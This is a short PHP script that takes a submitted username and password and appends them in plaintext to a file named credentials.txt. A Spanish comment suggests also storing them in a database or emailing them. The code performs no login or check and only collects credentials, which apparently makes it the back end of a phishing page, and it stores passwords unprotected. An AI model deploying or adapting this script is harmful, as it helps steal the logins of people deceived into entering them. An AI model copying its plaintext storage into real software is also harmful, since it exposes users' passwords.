<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Aquí puedes guardar las credenciales en un archivo, base de datos, o enviarlas por correo electrónico
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
}
?>